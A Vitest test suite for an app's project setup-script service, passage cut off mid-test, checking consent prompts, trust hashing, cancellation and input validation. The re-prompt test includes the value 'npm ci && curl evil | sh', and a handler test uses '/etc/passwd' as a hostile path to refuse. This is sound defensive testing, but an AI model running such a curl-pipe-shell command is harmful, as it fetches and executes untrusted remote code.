import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { promises as fs } from 'fs'
import os from 'os'
import path from 'path'
import { initPlatform, resetPlatformForTests } from './platform'
import { fakePlatform, type FakePlatform } from './platform-fake'
import { ProjectTrustStore, localTrustKey, sshTrustKey, hashTrustContent } from './project-trust-store'
import {
  projectTrustContent,
  type ProjectSettingsDoc,
  type ProjectSettingsFileV1,
  type ProjectSettingsSnapshot,
  type ProjectLocalSettings,
  type ProjectConsentRequest,
  type ProjectSetupConsentRequest,
  type ProjectSetupEvent,
  type ProjectSetupRunResult
} from '../shared/project-settings'
import { IPC } from '../shared/ipc'
import {
  ProjectSetupService,
  setupRunKey,
  type ProjectSetupRunner,
  type ProjectSetupTarget
} from './project-setup-service'
import { registerProjectSetupHandlers, type ProjectSetupHandlerDeps } from './project-setup-handlers'
import type { WorktreeListResult } from '../shared/worktree'

let userData: string
let plat: FakePlatform

beforeEach(async () => {
  userData = await fs.mkdtemp(path.join(os.tmpdir(), 'nt-setup-svc-'))
  plat = fakePlatform({ userDataDir: userData })
  initPlatform(plat)
})
afterEach(async () => {
  vi.useRealTimers()
  resetPlatformForTests()
  await fs.rm(userData, { recursive: true, force: true })
})

const target = (over: Partial<ProjectSetupTarget> = {}): ProjectSetupTarget => ({
  projectId: 'p1',
  projectName: 'App',
  rootPath: '/proj/app',
  ...over
})

const sharedFile = (doc: ProjectSettingsDoc): ProjectSettingsFileV1 => ({
  version: 1,
  rev: 1,
  savedAt: '2026-08-19T00:00:00.000Z',
  ...doc
})

const snapshot = (
  shared: ProjectSettingsFileV1 | null,
  local?: ProjectLocalSettings
): ProjectSettingsSnapshot => ({ shared, local })

const consentRequests = (): ProjectSetupConsentRequest[] =>
  plat.sent
    .filter((s) => s.channel === IPC.projectSetupConsentRequest)
    .map((s) => s.args[0] as ProjectSetupConsentRequest)

const dismissed = (): string[] =>
  plat.sent
    .filter((s) => s.channel === IPC.projectSetupConsentDismiss)
    .map((s) => (s.args[0] as { requestId: string }).requestId)

const events = (projectId = 'p1'): ProjectSetupEvent[] =>
  plat.sent
    .filter((s) => s.channel === IPC.projectSetupEvent(projectId))
    .map((s) => s.args[0] as ProjectSetupEvent)

interface RunnerRecorder {
  calls: Array<{ script: string; cwd: string; env: Record<string, string> }>
  runner: ProjectSetupRunner
}
const recorder = (exitCode = 0): RunnerRecorder => {
  const calls: RunnerRecorder['calls'] = []
  const runner: ProjectSetupRunner = async ({ script, cwd, env, onChunk }) => {
    calls.push({ script, cwd, env })
    onChunk('building\n')
    return { exitCode }
  }
  return { calls, runner }
}

describe('setupRunKey', () => {
  it('lets host workflows wait for setup exit and propagates a failed exit', async () => {
    let finish!: (value: { exitCode: number }) => void
    const svc = new ProjectSetupService({ trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'build' } }),
      runLocal: async () => new Promise(resolve => { finish = resolve }) })
    let settled = false
    const pending = svc.runAndWait(target()).then(() => { settled = true })
    await vi.waitFor(() => expect(finish).toBeTypeOf('function'))
    expect(settled).toBe(false)
    finish({ exitCode: 0 }); await pending
    expect(settled).toBe(true)
    const failed = new ProjectSetupService({ trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'build' } }), runLocal: recorder(1).runner })
    await expect(failed.runAndWait(target())).rejects.toThrow('failed')
  })
  it('is a location+kind identity, not a project id', () => {
    const a = setupRunKey(target({ projectId: 'a' }), 'setup')
    const b = setupRunKey(target({ projectId: 'b' }), 'setup')
    expect(a).toBe(b)
    expect(setupRunKey(target(), 'archive')).not.toBe(a)
    expect(setupRunKey(target({ rootPath: '/other' }), 'setup')).not.toBe(a)
    expect(
      setupRunKey(target({ ssh: { server: { host: 'h', user: 'u' }, remoteCwd: '/proj/app' } }), 'setup')
    ).not.toBe(a)
  })
})

describe('ProjectSetupService — local-sourced scripts', () => {
  it('mints a FRESH runId per launch, while the runKey (the single-flight key) stays deterministic', async () => {
    const { runner } = recorder()
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'echo hi' } }),
      runLocal: runner
    })
    const first = await svc.run(target(), 'setup')
    await vi.waitFor(() => expect(events().some((e) => e.state === 'done')).toBe(true))
    const second = await svc.run(target(), 'setup')
    await vi.waitFor(() => expect(events().filter((e) => e.state === 'done')).toHaveLength(2))

    expect(first.status).toBe('started')
    expect(second.status).toBe('started')
    const a = first as Extract<ProjectSetupRunResult, { status: 'started' }>
    const b = second as Extract<ProjectSetupRunResult, { status: 'started' }>
    // Same script, same location => the SAME single-flight key (that is what makes a concurrent
    // second launch `busy`)...
    expect(b.runKey).toBe(a.runKey)
    // ...and a DIFFERENT run identity, because both runs' `seq` counters start at 1 and a client
    // folding on runKey alone would swallow the second run as the first one's stale tail.
    expect(b.runId).not.toBe(a.runId)
    const ids = new Set(events().map((e) => e.runId))
    expect(ids).toEqual(new Set([a.runId, b.runId]))
    // Each run numbers its own events from 1.
    expect(events().filter((e) => e.runId === b.runId).map((e) => e.seq)).toEqual([1, 2, 3])
  })

  it('runs a local-sourced script without any consent prompt', async () => {
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'echo hi', waitForSetup: true } }),
      runLocal: runner
    })
    const res = await svc.run(target(), 'setup')
    // `runId` is a fresh uuid per launch (unlike the deterministic runKey), so it is matched by
    // shape: it is what tells this run from the NEXT run of the same script.
    expect(res).toEqual({
      status: 'started',
      runKey: setupRunKey(target(), 'setup'),
      runId: expect.any(String),
      waitForSetup: true
    })
    expect(consentRequests()).toEqual([])

    await vi.waitFor(() => expect(events().some((e) => e.state === 'done')).toBe(true))
    expect(calls).toHaveLength(1)
    expect(calls[0].script).toBe('echo hi')
    expect(calls[0].cwd).toBe('/proj/app')
    expect(calls[0].env).toEqual({
      NODETERM_ROOT_PATH: '/proj/app',
      NODETERM_WORKTREE_PATH: '/proj/app',
      NODETERM_PROJECT_NAME: 'App'
    })
    const seen = events()
    expect(seen[0].state).toBe('running')
    expect(seen.map((e) => e.seq)).toEqual(seen.map((_, i) => i + 1))
    expect(seen.some((e) => e.chunk === 'building\n')).toBe(true)
    const done = seen[seen.length - 1]
    expect(done).toMatchObject({ state: 'done', exitCode: 0, kind: 'setup' })
  })

  it('spawns in the worktree dir and reports a non-zero exit as failed', async () => {
    const { calls, runner } = recorder(3)
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'false' } }),
      runLocal: runner
    })
    const t = target({ worktreePath: '/proj/app-wt' })
    expect(await svc.run(t, 'setup')).toMatchObject({ status: 'started', waitForSetup: false })
    await vi.waitFor(() => expect(events().some((e) => e.state === 'failed')).toBe(true))
    expect(calls[0].cwd).toBe('/proj/app-wt')
    expect(calls[0].env.NODETERM_WORKTREE_PATH).toBe('/proj/app-wt')
    expect(calls[0].env.NODETERM_ROOT_PATH).toBe('/proj/app')
    expect(events().at(-1)).toMatchObject({ state: 'failed', exitCode: 3 })
  })
})

describe('ProjectSetupService — consent gate', () => {
  it('prompts once for a shared-sourced script; approve records the hash and runs', async () => {
    const trust = new ProjectTrustStore()
    const doc: ProjectSettingsDoc = { setup: { setupScript: 'npm ci', archiveScript: 'rm -rf node_modules' } }
    // The whole family is approved by one answer: setup+archive are hashed together.
    const hash = hashTrustContent(projectTrustContent('setup', doc)!)
    const calls: Array<{ script: string }> = []
    const trustedAtSpawn: boolean[] = []
    const runner: ProjectSetupRunner = async ({ script }) => {
      calls.push({ script })
      // The approval is persisted BEFORE anything runs — never "run first, record after".
      trustedAtSpawn.push(await trust.isTrusted(localTrustKey('/proj/app'), 'setup', hash))
      return { exitCode: 0 }
    }
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile(doc)),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    const req = consentRequests()[0]
    expect(req).toMatchObject({
      kind: 'setup',
      projectName: 'App',
      // The dialog is handed the WHOLE family, because that is what one answer approves.
      scripts: { setup: 'npm ci', archive: 'rm -rf node_modules' },
      previouslyApproved: false
    })
    expect(req.locationLabel).toContain('/proj/app')
    expect(calls).toHaveLength(0)

    svc.submitConsent(req.requestId, 'approve')
    expect(await pending).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(events().some((e) => e.state === 'done')).toBe(true))
    expect(calls).toHaveLength(1)
    expect(trustedAtSpawn).toEqual([true])
    expect(await trust.isTrusted(localTrustKey('/proj/app'), 'setup', hash)).toBe(true)

    // Second run of the same, still-trusted family: no second prompt.
    expect(await svc.run(target(), 'archive')).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(calls).toHaveLength(2))
    expect(calls[1].script).toBe('rm -rf node_modules')
    expect(consentRequests()).toHaveLength(1)
  })

  it('hashes and shows the SHARED family only — a local override never enters the trust content', async () => {
    const trust = new ProjectTrustStore()
    const { calls, runner } = recorder()
    // The two documents disagree about the family's OTHER script. The merged/effective doc would
    // hash `local-archive`; only the shared doc may be approved.
    const shared: ProjectSettingsDoc = { setup: { setupScript: 'npm ci', archiveScript: 'shared-archive' } }
    const merged: ProjectSettingsDoc = { setup: { setupScript: 'npm ci', archiveScript: 'local-archive' } }
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile(shared), { setup: { archiveScript: 'local-archive' } }),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    expect(consentRequests()[0].scripts).toEqual({ setup: 'npm ci', archive: 'shared-archive' })
    svc.submitConsent(consentRequests()[0].requestId, 'approve')
    expect(await pending).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(calls).toHaveLength(1))

    const key = localTrustKey('/proj/app')
    const record = await trust.getRecord(key, 'setup')
    expect(record?.contentHash).toBe(hashTrustContent(projectTrustContent('setup', shared)!))
    expect(record?.contentHash).not.toBe(hashTrustContent(projectTrustContent('setup', merged)!))
  })

  it('a local override of a shared script is local-sourced: it runs promptless', async () => {
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () =>
        snapshot(sharedFile({ setup: { setupScript: 'npm ci' } }), { setup: { setupScript: 'my own setup' } }),
      runLocal: runner
    })
    expect(await svc.run(target(), 'setup')).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(calls).toHaveLength(1))
    expect(calls[0].script).toBe('my own setup')
    expect(consentRequests()).toEqual([])
  })

  it('cancel while the dialog is open dismisses it, and a late approve cannot revive the run', async () => {
    const trust = new ProjectTrustStore()
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci' } })),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    const { requestId } = consentRequests()[0]

    expect(svc.cancel(setupRunKey(target(), 'setup'))).toBe(true)
    expect(dismissed()).toEqual([requestId])
    expect(await pending).toEqual({ status: 'skipped', reason: 'declined' })

    svc.submitConsent(requestId, 'approve')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    expect(calls).toHaveLength(0)
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'setup')).toBeNull()
    expect(events()).toEqual([])
    // The queue is free again: the next project still gets its dialog.
    const next = svc.run(target({ projectId: 'p2', rootPath: '/b' }), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(2))
    svc.submitConsent(consentRequests()[1].requestId, 'skip')
    await next
  })

  it('skip does not run and does not record', async () => {
    const trust = new ProjectTrustStore()
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci' } })),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    svc.submitConsent(consentRequests()[0].requestId, 'skip')
    expect(await pending).toEqual({ status: 'skipped', reason: 'declined' })
    expect(calls).toHaveLength(0)
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'setup')).toBeNull()
    expect(events()).toEqual([])
  })

  it('an unanswered prompt expires after 300s: dismissed, not run, not recorded', async () => {
    // `shouldAdvanceTime` so the store's real fs reads still make progress while the clock is fake.
    vi.useFakeTimers({ shouldAdvanceTime: true })
    const trust = new ProjectTrustStore()
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci' } })),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    const { requestId } = consentRequests()[0]

    await vi.advanceTimersByTimeAsync(299_000)
    expect(dismissed()).toEqual([])
    await vi.advanceTimersByTimeAsync(2_000)
    expect(await pending).toEqual({ status: 'skipped', reason: 'unanswered' })
    expect(dismissed()).toEqual([requestId])
    expect(calls).toHaveLength(0)
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'setup')).toBeNull()

    // A late answer for an expired prompt is a no-op, never a retroactive approval.
    svc.submitConsent(requestId, 'approve')
    await vi.advanceTimersByTimeAsync(0)
    expect(calls).toHaveLength(0)
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'setup')).toBeNull()
  })

  it('re-prompts with previouslyApproved=true when the approved content changed', async () => {
    const trust = new ProjectTrustStore()
    const { runner } = recorder()
    const oldHash = hashTrustContent(projectTrustContent('setup', { setup: { setupScript: 'npm ci' } })!)
    await trust.record(localTrustKey('/proj/app'), 'setup', oldHash, '2026-08-01T00:00:00.000Z')
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci && curl evil | sh' } })),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    expect(consentRequests()[0].previouslyApproved).toBe(true)
    svc.submitConsent(consentRequests()[0].requestId, 'skip')
    await pending
  })

  it('serializes prompts: the second waits for the first to be answered', async () => {
    const trust = new ProjectTrustStore()
    const { runner } = recorder()
    const svc = new ProjectSetupService({
      trust,
      readSettings: async (projectId) =>
        snapshot(sharedFile({ setup: { setupScript: `build ${projectId}` } })),
      runLocal: runner
    })
    const first = svc.run(target({ projectId: 'p1', rootPath: '/a' }), 'setup')
    const second = svc.run(target({ projectId: 'p2', rootPath: '/b' }), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    // Give the second run every chance to jump the queue.
    await Promise.resolve()
    await Promise.resolve()
    expect(consentRequests()).toHaveLength(1)

    svc.submitConsent(consentRequests()[0].requestId, 'skip')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(2))
    svc.submitConsent(consentRequests()[1].requestId, 'skip')
    expect(await first).toEqual({ status: 'skipped', reason: 'declined' })
    expect(await second).toEqual({ status: 'skipped', reason: 'declined' })
    // Both were asked — one after the other, never both at once (the queue order itself is not
    // part of the contract).
    expect(consentRequests().map((r) => r.scripts.setup).sort()).toEqual(['build p1', 'build p2'])
  })

  it('gates an ssh target on its ssh location key', async () => {
    const trust = new ProjectTrustStore()
    const calls: Array<ProjectSetupTarget['ssh']> = []
    const runSsh: ProjectSetupRunner = async ({ ssh }) => {
      calls.push(ssh)
      return { exitCode: 0 }
    }
    const ssh = { server: { host: 'h', user: 'u' }, remoteCwd: '/srv/app' }
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci' } })),
      runSsh
    })
    const pending = svc.run(target({ ssh }), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    expect(consentRequests()[0].locationLabel).toBe('u@h:/srv/app')
    svc.submitConsent(consentRequests()[0].requestId, 'approve')
    expect(await pending).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(calls).toHaveLength(1))
    const hash = hashTrustContent(projectTrustContent('setup', { setup: { setupScript: 'npm ci' } })!)
    expect(await trust.isTrusted(sshTrustKey(ssh), 'setup', hash)).toBe(true)
    expect(await trust.isTrusted(localTrustKey('/proj/app'), 'setup', hash)).toBe(false)
  })
})

describe('ProjectSetupService — single-flight, cancel and absent scripts', () => {
  it('a second run for the same target while one is live is busy', async () => {
    let release: (() => void) | undefined
    const gate = new Promise<void>((r) => {
      release = r
    })
    let started = 0
    const runner: ProjectSetupRunner = async () => {
      started++
      await gate
      return { exitCode: 0 }
    }
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'sleep 1' } }),
      runLocal: runner
    })
    expect(await svc.run(target(), 'setup')).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(started).toBe(1))
    expect(await svc.run(target(), 'setup')).toEqual({ status: 'skipped', reason: 'busy' })
    expect(started).toBe(1)

    release!()
    await vi.waitFor(() => expect(events().some((e) => e.state === 'done')).toBe(true))
    // Freed once it finished.
    expect(await svc.run(target(), 'setup')).toMatchObject({ status: 'started' })
    release!()
  })

  it('cancel aborts a live run and reports cancelled; an unknown runKey is false', async () => {
    const runner: ProjectSetupRunner = ({ signal }) =>
      new Promise((resolve) => {
        signal.addEventListener('abort', () => resolve({ exitCode: 130 }))
      })
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'sleep 100' } }),
      runLocal: runner
    })
    const res = await svc.run(target(), 'setup')
    expect(res.status).toBe('started')
    const runKey = (res as { runKey: string }).runKey
    expect(svc.cancel('nope')).toBe(false)
    expect(svc.cancel(runKey)).toBe(true)
    await vi.waitFor(() => expect(events().at(-1)?.state).toBe('cancelled'))
  })

  it('no script → no-script; ssh target without an ssh runner → unavailable', async () => {
    const { runner } = recorder()
    const empty = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, {}),
      runLocal: runner
    })
    expect(await empty.run(target(), 'setup')).toEqual({ status: 'skipped', reason: 'no-script' })

    const unknownProject = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => null,
      runLocal: runner
    })
    expect(await unknownProject.run(target(), 'setup')).toEqual({ status: 'skipped', reason: 'no-script' })

    // A setup script is not an archive script.
    const setupOnly = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'echo hi' } }),
      runLocal: runner
    })
    expect(await setupOnly.run(target(), 'archive')).toEqual({ status: 'skipped', reason: 'no-script' })

    const noSshRunner = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'echo hi' } }),
      runLocal: runner
    })
    expect(
      await noSshRunner.run(target({ ssh: { server: { host: 'h', user: 'u' }, remoteCwd: '/srv/app' } }), 'setup')
    ).toEqual({ status: 'skipped', reason: 'unavailable' })
  })
})

describe('registerProjectSetupHandlers', () => {
  const okWorktrees = (paths: string[] = []): ProjectSetupHandlerDeps['worktreeList'] =>
    async (): Promise<WorktreeListResult> => ({
      ok: true,
      entries: paths.map((p) => ({ path: p, branch: null, head: null, isBare: false }))
    })

  const defaultDeps = (over: Partial<ProjectSetupHandlerDeps> = {}): ProjectSetupHandlerDeps => ({
    projectTargetInfo: (projectId) => (projectId === 'p1' ? { cwd: '/proj/app', name: 'App' } : null),
    worktreeList: okWorktrees(),
    ...over
  })

  const stub = (deps: Partial<ProjectSetupHandlerDeps> = {}) => {
    const runs: Array<[ProjectSetupTarget, string]> = []
    const cancels: string[] = []
    const consents: Array<[string, string]> = []
    const service = {
      run: async (t: ProjectSetupTarget, kind: 'setup' | 'archive') => {
        runs.push([t, kind])
        return { status: 'started', runKey: 'k', runId: 'run-1', waitForSetup: false } as const
      },
      cancel: (runKey: string) => {
        cancels.push(runKey)
        return true
      },
      submitConsent: (requestId: string, answer: 'approve' | 'skip') => {
        consents.push([requestId, answer])
      }
    }
    registerProjectSetupHandlers(plat, service, defaultDeps(deps))
    return { runs, cancels, consents }
  }

  it('registers the whole surface, including the accepted subscribe no-ops', () => {
    stub()
    expect(Object.keys(plat.handlers)).toEqual(
      expect.arrayContaining([IPC.projectSetupRun, IPC.projectSetupCancel])
    )
    expect(Object.keys(plat.listeners)).toEqual(
      expect.arrayContaining([
        IPC.projectSetupConsentSubmit,
        IPC.projectSetupSubscribe,
        IPC.projectSetupUnsubscribe
      ])
    )
    expect(() => plat.listeners[IPC.projectSetupSubscribe]('p1')).not.toThrow()
    expect(() => plat.listeners[IPC.projectSetupUnsubscribe]('p1')).not.toThrow()
  })

  it('derives rootPath/projectName from projectTargetInfo — the wire carries only projectId/kind', async () => {
    const { runs } = stub()
    const call = plat.handlers[IPC.projectSetupRun]
    expect(await call('p1', 'archive')).toMatchObject({ status: 'started' })
    expect(runs).toHaveLength(1)
    expect(runs[0]).toEqual([{ projectId: 'p1', projectName: 'App', rootPath: '/proj/app' }, 'archive'])
  })

  it('derives an ssh target from projectTargetInfo alone — nothing ssh-shaped is on the wire', async () => {
    const ssh = { server: { host: 'h', user: 'u', port: 2222 }, remoteCwd: '/srv/app' }
    const { runs } = stub({ projectTargetInfo: (id) => (id === 'p1' ? { name: 'App', ssh } : null) })
    const call = plat.handlers[IPC.projectSetupRun]
    expect(await call('p1', 'setup')).toMatchObject({ status: 'started' })
    expect(runs[0][0]).toEqual({ projectId: 'p1', projectName: 'App', rootPath: '/srv/app', ssh })
  })

  it('answers unavailable for a malformed call instead of throwing, and never calls service.run', async () => {
    const { runs } = stub()
    const call = plat.handlers[IPC.projectSetupRun]
    for (const args of [[null, 'setup'], [7, 'setup'], ['', 'setup'], ['p1', 'launch'], ['p1', null]] as const) {
      expect(await call(...args)).toEqual({ status: 'skipped', reason: 'unavailable' })
    }
    // A non-string worktreePath (a hostile/buggy caller) is refused outright, not coerced.
    expect(await call('p1', 'setup', 42)).toEqual({ status: 'skipped', reason: 'unavailable' })
    expect(runs).toHaveLength(0)
  })

  it('refuses an unknown projectId — service.run is never reached', async () => {
    const { runs } = stub()
    const call = plat.handlers[IPC.projectSetupRun]
    expect(await call('missing', 'setup')).toEqual({ status: 'skipped', reason: 'unavailable' })
    expect(runs).toHaveLength(0)
  })

  it('refuses a relative worktreePath — service.run is never reached', async () => {
    const { runs } = stub()
    const call = plat.handlers[IPC.projectSetupRun]
    expect(await call('p1', 'setup', 'relative/path')).toEqual({ status: 'skipped', reason: 'unavailable' })
    expect(runs).toHaveLength(0)
  })

  it('refuses a hostile absolute worktreePath that is not one of the project\'s actual git worktrees', async () => {
    const { runs } = stub({ worktreeList: okWorktrees(['/proj/app.worktrees/real-branch']) })
    const call = plat.handlers[IPC.projectSetupRun]
    expect(await call('p1', 'setup', '/etc/passwd')).toEqual({ status: 'skipped', reason: 'unavailable' })
    expect(runs).toHaveLength(0)
  })

  it('accepts a worktreePath that matches one of the project\'s actual git worktrees', async () => {
    const wt = '/proj/app.worktrees/real-branch'
    const { runs } = stub({ worktreeList: okWorktrees([wt]) })
    const call = plat.handlers[IPC.projectSetupRun]
    expect(await call('p1', 'setup', wt)).toMatchObject({ status: 'started' })
    expect(runs[0][0]).toEqual({ projectId: 'p1', projectName: 'App', rootPath: '/proj/app', worktreePath: wt })
  })

  it('end to end: an unknown projectId never reaches the local runner', async () => {
    const { calls, runner } = recorder()
    const service = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'echo hi' } }),
      runLocal: runner
    })
    registerProjectSetupHandlers(plat, service, defaultDeps())
    const call = plat.handlers[IPC.projectSetupRun]
    expect(await call('missing', 'setup')).toEqual({ status: 'skipped', reason: 'unavailable' })
    expect(await call('p1', 'setup', '/etc/passwd')).toEqual({ status: 'skipped', reason: 'unavailable' })
    expect(calls).toHaveLength(0)
  })

  it('cancel and consent-submit reject junk arguments', async () => {
    const { cancels, consents } = stub()
    expect(await plat.handlers[IPC.projectSetupCancel]('k1')).toBe(true)
    expect(await plat.handlers[IPC.projectSetupCancel](7)).toBe(false)
    expect(cancels).toEqual(['k1'])

    plat.listeners[IPC.projectSetupConsentSubmit]('r1', 'approve')
    plat.listeners[IPC.projectSetupConsentSubmit]('r2', 'yes')
    plat.listeners[IPC.projectSetupConsentSubmit](5, 'approve')
    expect(consents).toEqual([['r1', 'approve']])
  })
})

/**
 * The consent prompt carries the SCRIPT BODIES of a shared settings file — the exact bytes a human
 * is being asked to authorize. `platform().broadcast` on the desktop fans out to every relay peer
 * (a paired phone, another desktop), so broadcasting the prompt would hand a guest the contents of
 * a file they may have no other way to read, and show them a dialog only the host may answer. The
 * shell therefore injects WHERE a prompt goes; the default stays broadcast, which is right for the
 * Server Edition (every attached client there is an authenticated operator of that host).
 */
describe('ProjectSetupService — consent delivery seam', () => {
  const seam = (): { sent: Array<{ channel: string; payload: unknown }>; send: (channel: string, payload: unknown) => void } => {
    const sent: Array<{ channel: string; payload: unknown }> = []
    return { sent, send: (channel, payload) => sent.push({ channel, payload }) }
  }

  it('routes the consent REQUEST through sendConsent, never through the peer-fanning broadcast', async () => {
    const s = seam()
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci --registry=secret' } })),
      runLocal: runner,
      sendConsent: s.send
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(s.sent).toHaveLength(1))
    expect(s.sent[0].channel).toBe(IPC.projectSetupConsentRequest)
    const req = s.sent[0].payload as ProjectSetupConsentRequest
    expect(req.scripts).toEqual({ setup: 'npm ci --registry=secret' })
    // The script body never entered the broadcast fan-out at all.
    expect(consentRequests()).toEqual([])
    expect(JSON.stringify(plat.sent)).not.toContain('secret')

    svc.submitConsent(req.requestId, 'approve')
    expect(await pending).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(calls).toHaveLength(1))
    // Run EVENTS keep broadcasting: they are the canvas's own run state, not the approval question.
    await vi.waitFor(() => expect(events().some((e) => e.state === 'done')).toBe(true))
  })

  it('routes the DISMISS through the same seam (cancel and expiry alike)', async () => {
    const s = seam()
    const { runner } = recorder()
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci' } })),
      runLocal: runner,
      sendConsent: s.send
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(s.sent).toHaveLength(1))
    const { requestId } = s.sent[0].payload as ProjectSetupConsentRequest

    expect(svc.cancel(setupRunKey(target(), 'setup'))).toBe(true)
    expect(s.sent[1]).toEqual({ channel: IPC.projectSetupConsentDismiss, payload: { requestId } })
    expect(dismissed()).toEqual([]) // and not to the peers
    expect(await pending).toEqual({ status: 'skipped', reason: 'declined' })
  })
})

/**
 * A local run is a DETACHED process group (setsid), deliberately, so a cancel can SIGKILL the whole
 * tree. The same property means an app quit leaves one running with nothing left to report to:
 * `npm ci` keeps churning after the window is gone. Every shell's shutdown path calls disposeAll.
 */
describe('ProjectSetupService — disposeAll', () => {
  it('aborts every active run, so each runner sees its own signal fire', async () => {
    const aborted: string[] = []
    const runner: ProjectSetupRunner = ({ cwd, signal }) =>
      new Promise((resolve) => {
        signal.addEventListener('abort', () => {
          aborted.push(cwd)
          resolve({ exitCode: 137 })
        })
      })
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'sleep 100' } }),
      runLocal: runner
    })
    const a = await svc.run(target({ projectId: 'p1', rootPath: '/a' }), 'setup')
    const b = await svc.run(target({ projectId: 'p2', rootPath: '/b' }), 'setup')
    expect([a.status, b.status]).toEqual(['started', 'started'])

    svc.disposeAll()
    expect(aborted.sort()).toEqual(['/a', '/b'])
    await vi.waitFor(() => expect(events('p1').at(-1)?.state).toBe('cancelled'))
    await vi.waitFor(() => expect(events('p2').at(-1)?.state).toBe('cancelled'))

    // Idempotent: a second pass (Electron runs before-quit twice) has nothing left to abort.
    expect(() => svc.disposeAll()).not.toThrow()
    expect(aborted).toHaveLength(2)
  })

  it('also closes a run still waiting at its consent dialog, and dismisses that dialog', async () => {
    const s: Array<{ channel: string; payload: unknown }> = []
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci' } })),
      runLocal: runner,
      sendConsent: (channel, payload) => s.push({ channel, payload })
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(s).toHaveLength(1))
    const { requestId } = s[0].payload as ProjectSetupConsentRequest

    svc.disposeAll()
    expect(s[1]).toEqual({ channel: IPC.projectSetupConsentDismiss, payload: { requestId } })
    expect(await pending).toEqual({ status: 'skipped', reason: 'declined' })
    expect(calls).toHaveLength(0)
  })
})

/**
 * `ensureFamilyTrusted` — the SAME gate as the setup runner's, aimed at the two families nothing in
 * this service executes: `agents` (launchCmd + env) and `shell` (the terminal program). A launcher
 * asks before it consumes a shared-sourced value; the answer is recorded per FAMILY, at the
 * LOCATION, and every asker's project is told to re-read its verdict.
 */
describe('ProjectSetupService — ensureFamilyTrusted', () => {
  const familyPrompts = (family: 'agents' | 'shell'): ProjectConsentRequest[] =>
    plat.sent
      .filter((s) => s.channel === IPC.projectSetupConsentRequest)
      .map((s) => s.args[0] as ProjectConsentRequest)
      .filter((r) => r.family === family)

  const trustChanged = (): string[] =>
    plat.sent
      .filter((s) => s.channel === IPC.projectTrustChanged)
